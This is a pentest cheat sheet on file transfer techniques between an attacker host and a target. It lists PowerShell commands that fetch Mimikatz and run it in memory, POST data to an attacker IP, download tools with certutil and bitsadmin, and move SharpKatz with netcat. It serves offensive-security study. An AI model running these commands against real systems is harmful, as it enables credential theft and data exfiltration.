# File Transfers

## **Introduction**

> There are many different methods to transfers files from a target machine to the attackers machine and vice versa. The following notes are a useful reference to help you achieve this task.

***

## **Basic Methods**

| Command                                                                                          | Description                                                                  |
| ------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------- |
| `cat filename \| base64 -w 0; echo` followed by `echo 'encoding-result' \| base64 -d`            | Encode and decode a file via base64 to transfer its content on local machine |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget                                                   |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL                                                   |

***

## **Using SSH Secure Copy (SCP)**

| Command                                                         | Description               |
| --------------------------------------------------------------- | ------------------------- |
| `scp C:\Temp\bloodhound.zip user@target-ip:/tmp/bloodhound.zip` | Upload a file using SCP   |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`        | Download a file using SCP |

***

## **Using a fake SMB Server**

| Command                                                                                  | Description                                                             |
| ---------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| `sudo impacket-smbserver sharename -smb2support /tmp/smbshare`                           | Create an SMB Server with anonymous access                              |
| `copy \\server-ip\share\nc.exe`                                                          | Copy file to previous SMB Server when anonymous access is available     |
| `sudo impacket-smbserver sharename -smb2support /tmp/smbshare -user test -password test` | Create an SMB Server hosting a share named "sharename" with credentials |
| `net use n: \\server-ip\sharename /user:test test`                                       | Copy file to previous SMB Server when anonymous access is NOT available |

***

## **Using RDP Shares and Clipboard**

* Create an SMB share containing the Kali user's home drive:\
  `xfreerdp /v:ip /u:user /p:password +home-drive`
* Connect to a FreeRDP server with a shared directory:\
  `xfreerdp /v:ip_address /u:username /p:password /drive:path/to/directory,share_name`
* Use RDP clipboard redirection:\
  `xfreerdp /v:ip_address /u:username /p:password +clipboard`

***

## **Windows File Transfers**

* Download a file with PowerShell:\
  `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`
* Execute a file in memory using PowerShell:\
  `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`
* Upload a file with PowerShell:\
  `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`
* Download a file using Bitsadmin:\
  `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`
* Download a file using Certutil:\
  `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`
* Download a file using PHP\
  `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
* Invoke-WebRequest using a Chrome User Agent:\
  `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"`

***

## **File Transfers with Netcat**

**Case 1 - Using nc to Upload from attacker to target:**

1. From the target machine: `nc -l -p 8000 > SharpKatz.exe`
2. From attacker machine: `nc -q 0 192.168.49.128 8000 < SharpKatz.exe`

**Case 2 - Using ncat to Upload from attacker to target:**

1. From the target machine: `ncat -l -p 8000 --recv-only > SharpKatz.exe`
2. From attacker machine: `ncat --send-only target-ip 8000 < SharpKatz.exe`
